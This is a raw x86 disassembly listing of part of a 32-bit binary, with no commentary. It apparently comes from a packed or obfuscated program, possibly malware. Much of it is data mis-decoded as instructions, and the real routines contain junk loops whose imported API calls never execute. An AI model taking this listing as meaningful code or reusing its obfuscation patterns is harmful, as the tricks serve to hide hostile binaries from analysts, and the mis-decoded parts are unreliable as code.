  4058f7:	sbb    bl,dl
  4058f9:	mov    edi,0x4a2ad75
  4058fe:	xchg   DWORD PTR [ecx],eax
  405900:	sub    al,0x75
  405902:	lea    ebx,[edi+esi*4]
  405905:	adc    eax,0x1b27b21f
  40590a:	call   0xa428:0xbf296122
  405911:	(bad)  
  405913:	loop   0x405899
  405915:	call   0x3bfeacf4
  40591a:	adc    BYTE PTR [ebx+esi*1],dl
  40591d:	lods   eax,DWORD PTR ds:[esi]
  40591e:	mov    ebp,0x6161393f
  405923:	test   DWORD PTR [ebx-0x17d84d2d],edi
  405929:	push   ebx
  40592a:	push   edx
  40592b:	das    
  40592c:	daa    
  40592d:	pop    edi
  40592e:	or     ah,bh
  405930:	call   0xe314744a
  405935:	adc    DWORD PTR [edi-0x7a76231],0xffffffbe
  40593c:	arpl   WORD PTR [eax+0x54a1e8b2],bp
  405942:	inc    ebp
  405943:	mov    ebp,DWORD PTR [ebx+eiz*4+0x249d9303]
  40594a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40594b:	rcr    DWORD PTR [esi+0x65],1
  40594e:	adc    dh,BYTE PTR [eax+ebx*4]
  405951:	call   0x7dbe:0x9491d362
  405958:	out    dx,eax
  405959:	dec    edx
  40595a:	sub    BYTE PTR [eax],0x84
  40595d:	mov    edi,0xbfb7e2db
  405962:	or     DWORD PTR [esi-0x4f],0xffffffc2
  405966:	dec    ebp
  405967:	imul   edi,DWORD PTR [edi+0x5e],0x2c1982c7
  40596e:	ss out 0x6a,al
  405971:	dec    ebp
  405972:	test   esi,edi
  405974:	sbb    ebx,DWORD PTR [edx]
  405976:	push   ss
  405977:	mov    esp,0x92559fac
  40597c:	aaa    
  40597d:	xchg   esp,eax
  40597e:	push   0x25
  405980:	test   BYTE PTR [eax+0x55],cl
  405983:	cld    
  405984:	jnp    0x4059ed
  405986:	sub    dh,BYTE PTR [edx+0x4171b655]
  40598c:	adc    eax,0xdc226b75
  405991:	xor    BYTE PTR [ecx],0xfd
  405994:	fnstcw WORD PTR [edx-0x23f57164]
  40599a:	and    ecx,edi
  40599c:	xor    edi,DWORD PTR [ecx+0xeb7b537]
  4059a2:	pop    ebp
  4059a3:	sub    al,0x41
  4059a5:	out    dx,eax
  4059a6:	mov    edx,0xeaf45e7
  4059ab:	adc    DWORD PTR [eax-0x7bfcd794],ecx
  4059b1:	sbb    eax,0xfd83ff1e
  4059b6:	sub    esp,DWORD PTR [ecx+edi*8]
  4059b9:	xorps  xmm7,xmm6
  4059bc:	retf   
  4059bd:	arpl   WORD PTR [ebx+0x40d64c0d],cx
  4059c3:	add    BYTE PTR [ecx],al
  4059c5:	or     BYTE PTR [edi+0x5e],bl
  4059c8:	pop    ebx
  4059c9:	leave  
  4059ca:	ret    
  4059cb:	push   ebp
  4059cc:	mov    ebp,esp
  4059ce:	sub    esp,0x44
  4059d1:	push   edi
  4059d2:	sub    eax,DWORD PTR ds:0x4235c7
  4059d8:	mov    eax,DWORD PTR [ebp+0xc]
  4059db:	or     DWORD PTR ds:0x417e4d,edx
  4059e1:	mov    DWORD PTR [ebp-0x10],eax
  4059e4:	mov    DWORD PTR ds:0x417e55,0x17
  4059ee:	cmp    DWORD PTR ds:0x417e55,0x0
  4059f5:	je     0x405a59
  4059fb:	cmp    DWORD PTR ds:0x417e55,0x6
  405a02:	jne    0x405a2b
  405a08:	push   DWORD PTR [ebp-0x24]
  405a0b:	push   DWORD PTR [ebp-0x28]
  405a0e:	push   0x417e45
  405a13:	push   0x80ed
  405a18:	push   0x67be
  405a1d:	push   0x6b4c
  405a22:	push   DWORD PTR [ebp-0x20]
  405a25:	call   DWORD PTR ds:0x40d1cc
  405a2b:	cmp    DWORD PTR ds:0x417e55,0x7
  405a32:	jne    0x405a47
  405a38:	xor    ecx,ecx
  405a3a:	or     ecx,DWORD PTR ds:0x417e55
  405a40:	dec    ecx
  405a41:	mov    DWORD PTR ds:0x417e55,ecx
  405a47:	mov    ecx,DWORD PTR ds:0x417e55
  405a4d:	dec    ecx
  405a4e:	mov    DWORD PTR ds:0x417e55,ecx
  405a54:	jmp    0x4059ee
  405a59:	mov    eax,DWORD PTR [ebp+0x8]
  405a5c:	or     DWORD PTR ds:0x417e41,0x3fc5
  405a66:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  405a6d:	xor    ecx,ecx
  405a6f:	add    ecx,DWORD PTR ds:0x4235c3
  405a75:	and    DWORD PTR ds:0x41abd6,ecx
  405a7b:	mov    DWORD PTR [ebp-0x20],0xf89c853b
  405a82:	mov    edx,DWORD PTR [ebp+0x8]
  405a85:	mov    DWORD PTR [ebp-0x40],eax
  405a88:	mov    eax,0x7510859
  405a8d:	xor    edx,eax
  405a8f:	adc    ecx,ecx
  405a91:	mov    ecx,0x32729f
  405a96:	movzx  edi,WORD PTR ds:0x41510d
  405a9d:	sbb    DWORD PTR ds:0x4235cf,edi
  405aa3:	add    edx,ecx
  405aa5:	add    DWORD PTR ds:0x412354,0x1575
  405aaf:	mov    DWORD PTR [ebp-0x8],edx
  405ab2:	jmp    0x405c04
  405ab7:	(bad)  [edi+ebp*4-0x19]
  405abb:	mov    eax,ds:0x80785be5
  405ac0:	cmp    DWORD PTR ds:[edi],edx
  405ac3:	mov    ch,0xb8
  405ac5:	ds hlt 
  405ac7:	xchg   BYTE PTR [ebx],cl
  405ac9:	jle    0x405b49
  405acb:	and    edi,DWORD PTR [edi+0x7e]
  405ace:	jle    0x405ac4
  405ad0:	cmp    eax,0x2928c6ea
  405ad5:	push   esp
  405ad6:	pop    esi
  405ad7:	adc    al,0x5e
  405ad9:	mov    ch,0xe1
  405adb:	test   BYTE PTR [ebp-0x483d005a],ah
  405ae1:	adc    al,0x97
  405ae3:	xchg   ecx,eax
  405ae4:	int3   
  405ae5:	cmp    dl,BYTE PTR [ebx]
  405ae7:	retf   
  405ae8:	stos   DWORD PTR es:[edi],eax
  405ae9:	or     eax,0xee0c40bb
  405aee:	out    0xac,eax
  405af0:	jp     0x405aef
  405af2:	push   eax
  405af3:	add    DWORD PTR [eax+0x36],eax
  405af6:	sub    BYTE PTR [edi+0x7e],0x80
  405afa:	add    ch,BYTE PTR [ecx+edx*2-0x78d024b]
  405b01:	add    edx,DWORD PTR [edx-0x2132b720]
  405b07:	in     eax,0x14
  405b09:	fild   QWORD PTR [esi+0x93804d4]
  405b0f:	sub    al,0xb8
  405b11:	pop    esi
  405b12:	dec    eax
  405b13:	inc    eax
  405b14:	xchg   ecx,eax
  405b15:	sub    DWORD PTR [ebx],0xffffffea
  405b18:	and    eax,0x3f715b76
  405b1d:	out    0x8a,eax
  405b1f:	mov    DWORD PTR [edi],ecx
  405b21:	rcr    DWORD PTR [esi],0xc
  405b24:	xor    edi,ebx
  405b26:	fidivr DWORD PTR [ecx]
  405b28:	pxor   mm6,QWORD PTR fs:[ecx-0x5496e6e3]
  405b30:	jge    0x405ba4
  405b32:	add    BYTE PTR [edx+0x53],cl
  405b35:	mov    WORD PTR [edx],ss
  405b37:	popa   
  405b38:	jo     0x405ad3
  405b3a:	fsubr  QWORD PTR [ebp+edx*2-0x5622ef4f]
  405b41:	repz test edx,eax
  405b44:	(bad)  
  405b45:	push   ebp
  405b46:	push   cs
  405b47:	or     eax,ebp
  405b49:	(bad)  
  405b4a:	in     eax,dx
  405b4b:	push   esp
  405b4c:	daa    
  405b4d:	mov    DWORD PTR [ecx-0x10bc763],ebx
  405b53:	xor    ch,BYTE PTR [edx-0xf960e69]
  405b59:	pop    eax
  405b5a:	addr16 jp 0x405bca
  405b5d:	mov    BYTE PTR [eax+0x4ec279a5],0x5c
  405b64:	std    
  405b65:	inc    eax
  405b66:	retf   0x16cb
  405b69:	js     0x405b2f
  405b6b:	mov    ds:0x88c28b0f,al
  405b70:	in     al,0x6b
  405b72:	jns    0x405b0b
  405b74:	jge    0x405b71
  405b76:	cmp    DWORD PTR [edx],ecx
  405b78:	cmp    eax,0xf5b5edff
  405b7d:	jno    0x405ba3
  405b7f:	mov    al,0x58
  405b81:	test   DWORD PTR [ebx+0x15393b2d],ebx
  405b87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b88:	jno    0x405baf
  405b8a:	xor    DWORD PTR [ebp-0x46d6344e],0xff870415
  405b94:	jl     0x405bef
  405b96:	pop    ebp
  405b97:	cmp    DWORD PTR ds:0xa29c57b3,0xe2bfc611
  405ba1:	rol    DWORD PTR [ebx-0xd6c901b],1
  405ba7:	inc    eax
  405ba8:	xchg   esi,eax
  405ba9:	inc    eax
  405baa:	rcr    BYTE PTR [edi],1
  405bac:	adc    al,0x8c
  405bae:	aas    
  405baf:	outs   dx,DWORD PTR ds:[esi]
  405bb0:	add    ebp,ecx
  405bb2:	sets   BYTE PTR [edx]
  405bb5:	mov    esp,0x73c79929
  405bba:	push   0x4c86a532
  405bbf:	and    al,BYTE PTR [esp+edx*2]
  405bc2:	push   es
  405bc3:	push   0xa3002a6d
  405bc8:	mov    bh,0x52
  405bcb:	test   BYTE PTR ds:0x9c61618,ch
  405bd1:	aas    
  405bd2:	cmp    eax,0x964b7df4
  405bd7:	xchg   ecx,eax
  405bd8:	in     eax,dx
  405bd9:	xor    al,0xd9
  405bdb:	sub    dh,BYTE PTR [eax]
  405bdd:	fidiv  DWORD PTR [edx]
  405bdf:	lods   al,BYTE PTR ds:[esi]
  405be0:	pop    ecx
  405be1:	xchg   edi,eax
  405be2:	out    0x48,eax
  405be4:	and    dh,dh
  405be6:	pop    esi
  405be7:	dec    esi
  405be8:	js     0x405ba3
  405bea:	ud0    esi,DWORD PTR [edi-0x4eb9971a]
  405bf1:	popf   
  405bf2:	in     eax,0xaf
  405bf4:	adc    BYTE PTR [ebp-0x25d10fd5],al
  405bfa:	jecxz  0x405c66
  405bfc:	leave  
  405bfd:	into   
  405bfe:	lock xlat BYTE PTR ds:[ebx]
  405c00:	cmp    BYTE PTR [esi+0x4],dh
  405c03:	imul   ecx,DWORD PTR [ebx+0x25810855],0xffffffd7
  405c0a:	xor    eax,0x42
  405c0f:	add    BYTE PTR [eax],al
  405c11:	jmp    0x405c25
  405c16:	xor    edi,edi
  405c18:	or     edi,DWORD PTR ds:0x4235d7
  405c1e:	inc    edi
  405c1f:	mov    DWORD PTR ds:0x4235d7,edi
  405c25:	cmp    DWORD PTR ds:0x4235d7,0x11
  405c2c:	jae    0x405c53
  405c32:	cmp    DWORD PTR ds:0x4235d7,0x1a
  405c39:	jne    0x405c48
  405c3f:	push   DWORD PTR [ebp-0x1c]
  405c42:	call   DWORD PTR ds:0x40d29c
  405c48:	jmp    0x405c16
  405c4d:	xor    DWORD PTR ds:0x412358,ebx
  405c53:	xor    edx,eax
  405c55:	add    edx,ecx
  405c57:	jmp    0x405da9
  405c5c:	xchg   edi,eax
  405c5d:	(bad)  
  405c5e:	call   0xe86f:0x6bdabbc6
  405c65:	pop    ds
  405c66:	jb     0x405cc2
  405c68:	mov    ds:0x4b38bcbc,eax
  405c6d:	or     BYTE PTR [esi+0x7e],bh
  405c70:	and    edi,DWORD PTR [edi+0x7e]
  405c73:	jle    0x405ca7
  405c75:	xchg   ecx,eax
  405c76:	test   BYTE PTR [esi-0x4],dh
  405c79:	cmp    al,0xe
  405c7b:	dec    edi
  405c7c:	jbe    0x405c4d
  405c7e:	je     0x405cef
  405c80:	dec    eax
  405c81:	ror    DWORD PTR [esi],0x2
  405c84:	shl    BYTE PTR [eax-0x4cb229cf],0xeb
  405c8b:	jb     0x405d02
  405c8d:	mov    DWORD PTR [ecx-0x20181a41],ecx
  405c93:	cmp    al,BYTE PTR [ebp+eiz*8+0x25b411df]
  405c9a:	cld    
  405c9b:	xchg   ecx,eax
  405c9c:	retf   0x40e8
  405c9f:	inc    ebp
  405ca0:	fidivr DWORD PTR [esi-0x4cca7c4b]
  405ca6:	fucomp st(6)
  405ca8:	push   esp
  405ca9:	ficomp DWORD PTR [ebx+0x17]
  405cac:	leave  
  405cad:	or     ch,BYTE PTR [ecx-0x2d]
  405cb0:	cmp    DWORD PTR [esp+ebx*2],eax
  405cb3:	leave  
  405cb4:	pop    ds
  405cb5:	ins    DWORD PTR es:[edi],dx
  405cb6:	push   edi
  405cb7:	retf   0xa75d
  405cba:	mov    ebx,0xdefc140a
  405cbf:	add    dl,BYTE PTR [eax]
  405cc1:	aam    0x8d
  405cc3:	push   edx
  405cc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cc5:	and    DWORD PTR [eax+edi*1+0x60419952],ebp
  405ccc:	out    dx,eax
  405ccd:	inc    esi
  405cce:	addr16 (bad) 
  405cd0:	retf   0xb5c3
  405cd3:	std    
  405cd4:	dec    esp
  405cd5:	adc    ebx,DWORD PTR [esi]
  405cd7:	mov    ebx,esi
  405cd9:	popf   
  405cda:	jnp    0x405ce9
  405cdc:	cmp    eax,0x3b1e8410
  405ce1:	and    DWORD PTR [edx+0x14],eax
  405ce4:	es add cl,cl
  405ce7:	or     BYTE PTR [edi],0xea
  405cea:	jo     0x405d29
  405cec:	mov    bh,0x45
  405cee:	add    bh,bl
  405cf0:	push   ds
  405cf1:	pop    ebp
  405cf2:	in     al,0x68
  405cf4:	xor    al,0xb8
  405cf6:	ror    BYTE PTR [esp+ebx*1],0x9
  405cfa:	(bad)  
  405cfb:	int    0x75
  405cfd:	imul   esi,DWORD PTR [ebx],0x89162db8
  405d03:	mov    bh,0x52
  405d05:	or     al,0x5e
  405d07:	mov    esi,0xfe8e150b
  405d0c:	(bad)  
  405d0d:	lock cmp al,BYTE PTR [edi-0x73]
  405d11:	test   BYTE PTR [eax+0x6b],0x42
  405d15:	lea    esp,[ebx]
  405d17:	sub    al,0xd3
  405d19:	mov    edi,DWORD PTR [esp+edi*4+0x6825a89f]
  405d20:	xchg   DWORD PTR [edx],edi
  405d22:	and    ah,BYTE PTR [esi+0x72]
  405d25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d26:	test   eax,0xa0868502
  405d2b:	sub    DWORD PTR [eax],edi
  405d2d:	xchg   edi,eax
  405d2e:	ret    0xa529
  405d31:	inc    esp
  405d32:	scas   eax,DWORD PTR es:[edi]
  405d33:	dec    edi
  405d34:	ss dec eax
  405d36:	ss (bad) 
  405d38:	and    al,0x21
  405d3a:	sub    eax,0x79ddcc57
  405d3f:	xchg   ebp,eax
  405d40:	mov    bl,0xaa
  405d42:	iret   
  405d43:	inc    esp
  405d44:	and    BYTE PTR [ecx],dh
  405d46:	out    dx,al
  405d47:	rcr    eax,cl
  405d49:	cmp    al,0xa6
  405d4b:	in     al,0xe5
  405d4d:	mov    eax,DWORD PTR [ecx]
  405d4f:	imul   esp,DWORD PTR [edi+0x1f],0x24
  405d53:	jle    0x405d79
  405d55:	sub    BYTE PTR [esi+0x4cb465f5],0x9f
  405d5c:	mov    eax,ds:0xc10ab69c
  405d61:	icebp  
  405d62:	inc    esi
  405d63:	imul   ecx,DWORD PTR [ecx-0x1fd4cf74],0x5c
  405d6a:	xchg   edi,eax
  405d6b:	fnstsw WORD PTR [esi+ecx*2+0x331773e]
  405d72:	xor    bl,bl
  405d74:	(bad)  
  405d75:	rol    DWORD PTR [ecx-0x6de85c29],cl
  405d7b:	xchg   ebp,eax
  405d7c:	pop    dx
  405d7e:	xor    al,0xb
  405d80:	push   ss
  405d81:	call   0x72bfd53d
  405d86:	mov    ds:0xb497d246,al
  405d8b:	push   ecx
  405d8c:	push   esp
  405d8d:	xchg   BYTE PTR [edi-0x62],dl
  405d90:	fs pusha 
  405d92:	add    BYTE PTR [ebp-0x4c],dh
  405d95:	les    edi,FWORD PTR [eax]
  405d97:	(bad)
  405d9a:	aam    0x41
  405d9c:	push   eax
  405d9d:	pusha  
  405d9e:	iret   
  405d9f:	inc    edx
  405da0:	push   ecx
  405da1:	cmp    al,0x82
  405da3:	cld    
  405da4:	xor    edx,edi
  405da6:	dec    ebx
  405da7:	or     al,0x62
  405da9:	mov    DWORD PTR [ebp+0xc],edx
  405dac:	inc    edi
  405dad:	jmp    0x405eff
  405db2:	or     eax,0xb8afae9b
  405db7:	mov    ebx,0x598db90d
  405dbc:	or     al,0x3
  405dbe:	std    
  405dbf:	test   al,0xdd
  405dc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dc2:	jl     0x405dd2
  405dc4:	jle    0x405e44
  405dc6:	and    edi,DWORD PTR [edi+0x7e]
  405dc9:	jle    0x405d80
  405dcb:	xor    eax,0x539ad18a
  405dd0:	loop   0x405d5a
  405dd2:	inc    edi
  405dd3:	mov    bh,0x6c
  405dd5:	xchg   ecx,eax
  405dd6:	pushf  
  405dd7:	inc    edx
  405dd8:	and    DWORD PTR [esi],ebp
  405dda:	jbe    0x405d81
  405ddc:	xchg   esi,eax
  405ddd:	in     eax,0xcc
  405ddf:	mov    al,0x29
  405de1:	adc    eax,0xc236387d
  405de6:	sub    eax,0xb7b6d2b8
  405deb:	and    DWORD PTR [ebp+0x36],ecx
  405dee:	add    dh,BYTE PTR [ecx+0x4b]
  405df1:	inc    edi
  405df2:	xor    esp,ecx
  405df4:	xor    al,0xb2
  405df6:	shr    BYTE PTR [ebx-0x2a],0x4
  405dfa:	(bad)  
  405dfb:	neg    DWORD PTR [esi-0x8]
  405dfe:	mov    dl,0xd0
  405e00:	jns    0x405d8c
  405e02:	xchg   ecx,eax
  405e03:	fisub  DWORD PTR ds:0x88268152
  405e09:	lahf   
  405e0a:	popf   
  405e0b:	mov    ds:0x9fcdc6b2,al
  405e10:	bound  esp,QWORD PTR [ecx]
  405e12:	pop    ds
  405e13:	scas   al,BYTE PTR es:[edi]
  405e14:	mov    ds:0x6ad3a257,al
  405e19:	cmp    eax,0xfcaf7a0f
  405e1e:	mov    ebx,0x2cf2d2d4
  405e23:	xlat   BYTE PTR ds:[ebx]
  405e24:	int    0xd5
  405e26:	aad    0x1d
  405e28:	xor    DWORD PTR [eax-0x356f1db3],eax
  405e2e:	data16 (bad) 
  405e30:	mov    ds:0xb8f9738f,al
  405e35:	out    dx,eax
  405e36:	mov    ecx,0x389b9d05
  405e3b:	call   0x31b5:0xb7343840
  405e42:	cmp    eax,0x1533b1e8
  405e47:	adc    ebp,DWORD PTR ds:0x48b19612
  405e4d:	jecxz  0x405dd9
  405e4f:	js     0x405e3a
  405e51:	ret    0xebca
  405e54:	mov    esp,0xc0fd9b2c
  405e59:	rcl    DWORD PTR [edx],1
  405e5b:	add    esp,DWORD PTR [edi+eax*4]
  405e5e:	fcomp  DWORD PTR [eax-0xe]
  405e61:	mov    ecx,0x5b578d0f
  405e66:	shr    BYTE PTR [ebx],0x56
  405e69:	dec    eax
  405e6a:	shr    DWORD PTR [ecx+eiz*1],0xb2
  405e6e:	or     eax,0x4920d202
  405e73:	mov    ebp,0x89a07d91
  405e78:	jno    0x405dfb
  405e7a:	retf   
  405e7b:	hlt    
  405e7c:	test   al,0x50
  405e7e:	(bad)  
  405e7f:	je     0x405ea9
  405e81:	mov    cs,WORD PTR [eax]
  405e83:	mov    DWORD PTR [edi+0xb],ebp
  405e86:	cmc    
  405e87:	daa    
  405e88:	cmp    dh,BYTE PTR [edi+0x5e574cb6]
  405e8e:	sbb    dh,al
  405e90:	and    BYTE PTR [edi+0x24],ch
  405e93:	pop    ds
  405e94:	fcmovb st,st(3)
  405e96:	fistp  QWORD PTR [ebx]
  405e98:	sbb    BYTE PTR [edx-0x59],al
  405e9b:	(bad)  
  405e9c:	sar    BYTE PTR [edi-0x5a],1
  405e9f:	outs   dx,BYTE PTR ds:[esi]
  405ea0:	dec    edx
  405ea1:	sub    ebp,esp
  405ea3:	lock out dx,eax
  405ea5:	cs repz xchg edi,eax
  405ea8:	call   0x5ba3:0xba4a2260
  405eaf:	fcmove st,st(0)
  405eb1:	mov    ebx,0x25887d0a
  405eb6:	(bad)  
  405eb8:	xchg   ebp,eax
  405eb9:	aad    0x6b
  405ebb:	bnd jl 0x405e6c
  405ebe:	sub    dl,BYTE PTR [ecx+0xd]
  405ec1:	std    
  405ec2:	call   0x7feb4dc7
  405ec7:	(bad)  
  405ec8:	lea    esi,[edx]
  405eca:	aaa    
  405ecb:	enter  0x6b9b,0x9e
  405ecf:	jl     0x405e61
  405ed1:	jmp    0x405f3a
  405ed3:	jecxz  0x405e9c
  405ed5:	push   edi
  405ed6:	add    al,0x63
  405ed8:	stos   BYTE PTR es:[edi],al
  405ed9:	mov    al,0x6
  405edb:	add    ch,BYTE PTR [edi]
  405edd:	add    eax,edx
  405edf:	popa   
  405ee0:	mov    ah,BYTE PTR [edx]
  405ee2:	sub    eax,0x41a0608f
  405ee7:	push   0x46
  405ee9:	addr16 dec edx
  405eeb:	neg    DWORD PTR [edx+edx*2-0x40]
  405eef:	rcl    DWORD PTR [eax+0x35b2489d],0xb7
  405ef6:	pusha  
  405ef7:	outs   dx,BYTE PTR ds:[esi]
  405ef8:	sub    esp,ebx
  405efa:	call   0x45c7:0xb03e8846
  405f01:	cld    
  405f02:	fadd   DWORD PTR [ebp-0xcc0764]
  405f08:	xor    edi,DWORD PTR ds:0x415109
  405f0e:	adc    edi,DWORD PTR ds:0x4235bf
  405f14:	mov    DWORD PTR ds:0x415109,edi
  405f1a:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  405f21:	mov    DWORD PTR [ebp-0x2c],0xf89c853d
  405f28:	adc    edi,edi
  405f2a:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  405f31:	or     DWORD PTR ds:0x4235cf,edx
  405f37:	mov    DWORD PTR [ebp-0x34],0xf89c853f
  405f3e:	mov    DWORD PTR ds:0x417e41,0x15
  405f48:	cmp    DWORD PTR ds:0x417e41,0x0
  405f4f:	je     0x405fae
  405f55:	cmp    DWORD PTR ds:0x417e41,0x5
  405f5c:	jne    0x405f7c
  405f62:	push   0x43a6
  405f67:	push   0x41ac41
  405f6c:	push   0x41ac72
  405f71:	push   0x400000
  405f76:	call   DWORD PTR ds:0x40d1d0
  405f7c:	cmp    DWORD PTR ds:0x417e41,0x6
  405f83:	jne    0x405f96
  405f89:	mov    edi,DWORD PTR ds:0x417e41
  405f8f:	dec    edi
  405f90:	mov    DWORD PTR ds:0x417e41,edi
  405f96:	mov    edi,DWORD PTR ds:0x417e41
  405f9c:	dec    edi
  405f9d:	mov    DWORD PTR ds:0x417e41,edi
  405fa3:	jmp    0x405f48
  405fa8:	xor    edi,DWORD PTR ds:0x417e4d
  405fae:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  405fb5:	and    DWORD PTR ds:0x412364,0xe44
  405fbf:	mov    DWORD PTR [ebp-0x3c],0xf89c8531
  405fc6:	or     DWORD PTR ds:0x417e49,0x6f97
  405fd0:	mov    edx,DWORD PTR [ebp+0x8]
  405fd3:	and    DWORD PTR ds:0x417e55,0x0
  405fdd:	jmp    0x405fef
  405fe2:	mov    edi,DWORD PTR ds:0x417e55
  405fe8:	inc    edi
  405fe9:	mov    DWORD PTR ds:0x417e55,edi
  405fef:	cmp    DWORD PTR ds:0x417e55,0x14
  405ff6:	jae    0x40601f
  405ffc:	cmp    DWORD PTR ds:0x417e55,0x1c
  406003:	jne    0x406014
  406009:	push   0x67ac
  40600e:	call   DWORD PTR ds:0x40d2a0
  406014:	jmp    0x405fe2
  406019:	sub    edi,DWORD PTR ds:0x412378
  40601f:	xor    edx,eax
  406021:	mov    edi,DWORD PTR [ebp-0x10]
  406024:	add    edx,ecx
  406026:	cmp    edi,edx
  406028:	mov    DWORD PTR ds:0x412368,0x5602
  406032:	je     0x407428
  406038:	mov    DWORD PTR ds:0x415109,0xf2d
  406042:	jmp    0x406194
  406047:	lock mov ebx,0xdc791c5b
  40604d:	jns    0x40600a
  40604f:	mov    eax,ds:0xdbdb13c5
  406054:	(bad)  
  406055:	enter  0x21f3,0xf
  406059:	jle    0x4060d9
  40605b:	and    edi,DWORD PTR [edi+0x7e]
  40605e:	jle    0x40606d
  406060:	loopne 0x40605b
  406062:	shl    DWORD PTR ds:0x28a22759,0x3c
  406069:	push   esp
  40606a:	mov    eax,0x69ce6127
  40606f:	push   ebp
  406070:	call   0x1397:0xeaa1ae44
  406077:	jmp    0x406092
  406079:	hlt    
  40607a:	jp     0x4060d1
  40607c:	cmp    bh,BYTE PTR ds:0xab53448c
  406082:	aaa    
  406083:	sub    al,0x44
  406085:	ds in  al,0x99
  406088:	dec    esi
  406089:	and    dh,0xf
  40608c:	adc    BYTE PTR [eax+0x3],dh
  40608f:	mov    eax,ds:0x3f0accfe
  406094:	stc    
  406095:	push   fs
  406097:	adc    DWORD PTR [esi],esi
  406099:	loopne 0x406114
  40609b:	fidivr WORD PTR [ebx+0x776f1a31]
  4060a1:	test   al,0x62
  4060a3:	xor    al,0xcd
  4060a5:	test   eax,0xa9ee93b7
  4060aa:	push   0x7910387d
  4060af:	in     eax,dx
  4060b0:	in     al,dx
  4060b1:	repz fstp TBYTE PTR [ebp+0x9f89439]
  4060b8:	and    eax,0xe5c3c004
  4060bd:	loopne 0x406078
  4060bf:	(bad)  
  4060c0:	cmp    edi,DWORD PTR [ebp+0x69]
  4060c3:	mov    cl,0x9
  4060c5:	fwait
  4060c6:	les    esp,FWORD PTR [ebp-0x7e]
  4060c9:	in     al,dx
  4060ca:	jno    0x4060f1
  4060cc:	mov    ah,0xd3
  4060ce:	sub    ebx,ebp
  4060d0:	xor    ecx,DWORD PTR [esi+edx*1-0xd380429]
  4060d7:	fnsave [ebx]
  4060d9:	jmp    0xcbd18854
  4060de:	(bad)
  4060e2:	sar    BYTE PTR [esi-0x367243a4],0xdc
  4060e9:	jle    0x406114
  4060eb:	mov    bl,0xf9
  4060ed:	xchg   ecx,eax
  4060ee:	shl    BYTE PTR [edx+0x77ee4a70],cl
  4060f4:	mov    WORD PTR es:[ebx-0x7f881860],fs
  4060fb:	mov    dl,0xde
  4060fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060fe:	shl    al,1
  406100:	sbb    cl,BYTE PTR [eax]
  406102:	mov    ch,0x7b
  406104:	adc    al,0xce
  406106:	mov    al,ds:0xab4d4f60
  40610b:	xor    eax,0xd6bb4991
  406110:	pop    eax
  406111:	xchg   edx,eax
  406112:	lahf   
  406113:	outs   dx,BYTE PTR ds:[esi]
  406114:	mov    ds:0x64963fb6,al
  406119:	out    0xd,eax
  40611b:	cli    
  40611c:	jmp    0x3971d67c
  406121:	in     al,dx
  406122:	and    eax,0x8b350e03
  406127:	push   ds
  406128:	mov    esp,0x220dbcf7
  40612d:	jle    0x406168
  40612f:	jae    0x4060d0
  406131:	jno    0x406122
  406133:	jae    0x406106
  406135:	xor    ebp,DWORD PTR [ecx+0x16]
  406138:	pop    esp
  406139:	add    BYTE PTR [ecx],dh
  40613b:	fsubr  st,st(6)
  40613d:	xchg   ebx,eax
  40613e:	push   esi
  40613f:	cmc    
  406140:	sti    
  406141:	sub    al,0xd1
  406143:	test   ecx,ecx
  406145:	add    cl,BYTE PTR [eax+eax*1-0x55ff3558]
  40614c:	mov    ds:0x667f6f5b,eax
  406151:	add    eax,0x66c00660
  406156:	mov    ds:0x51d3ffc8,al
  40615b:	mov    DWORD PTR [ebx-0x1b],ebx
  40615e:	adc    al,0x72
  406160:	lods   eax,DWORD PTR ds:[esi]
  406161:	mov    ch,dl
  406163:	idiv   BYTE PTR [ebx]
  406165:	sbb    al,0x27
  406167:	pop    edx
  406168:	mov    ebp,0xfe0f1092
  40616d:	(bad)  
  40616e:	fisubr WORD PTR [ecx]
  406170:	fs out dx,eax
  406172:	mov    ecx,DWORD PTR [edx-0x4e9a89b1]
  406178:	mov    eax,ds:0x3612a992
  40617d:	xchg   ebx,eax
  40617e:	mov    ebp,0x5250528d
  406183:	fild   DWORD PTR ss:[edx+0x7698717c]
  40618a:	pushf  
  40618b:	stc    
  40618c:	imul   esi,DWORD PTR [ecx-0x7f],0x23
  406190:	mov    ds:0x53d54aeb,al
  406195:	jmp    0x40715f
  40619a:	and    DWORD PTR ds:0x412370,0x0
  4061a4:	jmp    0x4061b6
  4061a9:	mov    edx,DWORD PTR ds:0x412370
  4061af:	inc    edx
  4061b0:	mov    DWORD PTR ds:0x412370,edx
  4061b6:	cmp    DWORD PTR ds:0x412370,0x1e
  4061bd:	jae    0x4061ea
  4061c3:	cmp    DWORD PTR ds:0x412370,0x2a
  4061ca:	jne    0x4061e3
  4061d0:	push   DWORD PTR [ebp-0x10]
  4061d3:	push   0x41acf1
  4061d8:	push   0x41ac28
  4061dd:	call   DWORD PTR ds:0x40d000
  4061e3:	jmp    0x4061a9
  4061e8:	adc    edi,edi
  4061ea:	mov    edx,DWORD PTR [ebp-0x8]
  4061ed:	mov    DWORD PTR ds:0x412364,0x11
  4061f7:	cmp    DWORD PTR ds:0x412364,0x0
  4061fe:	je     0x406239
  406204:	cmp    DWORD PTR ds:0x412364,0x14
  40620b:	jne    0x406227
  406211:	push   0x44a4
  406216:	push   DWORD PTR [ebp-0x20]
  406219:	push   0x788c
  40621e:	push   DWORD PTR [ebp-0x10]
  406221:	call   DWORD PTR ds:0x40d360
  406227:	mov    edi,DWORD PTR ds:0x412364
  40622d:	dec    edi
  40622e:	mov    DWORD PTR ds:0x412364,edi
  406234:	jmp    0x4061f7
  406239:	mov    edi,DWORD PTR [ebp-0x10]
  40623c:	or     DWORD PTR ds:0x41235c,0x6f22
  406246:	sub    edi,edx
  406248:	adc    DWORD PTR ds:0x4235c3,edi
  40624e:	mov    edx,DWORD PTR [ebp-0x4]
  406251:	adc    DWORD PTR ds:0x41abca,0x7639
  40625b:	xor    edx,eax
  40625d:	sbb    DWORD PTR ds:0x4235d3,0x415105
  406267:	add    edx,ecx
  406269:	mov    DWORD PTR ds:0x41abda,0x19aa
  406273:	cmp    edi,edx
